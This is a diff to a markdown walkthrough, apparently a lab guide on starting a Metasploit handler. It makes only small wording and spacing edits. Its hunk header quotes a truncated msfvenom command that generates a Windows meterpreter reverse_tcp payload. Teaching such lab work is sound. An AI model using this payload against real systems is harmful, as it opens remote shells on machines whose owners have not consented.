@@ -97,12 +97,9 @@ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[You
 <hr>
 
 ## Step 2: Starting The Metasploit Handler
-Let's start the **Metasploit** Handler. 
-
 **Double-click** the `Ubuntu Shell` icon on the desktop to open another **Linux terminal**:
 
 <img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
-
 
 Now let's start the **Metasploit** Handler
 
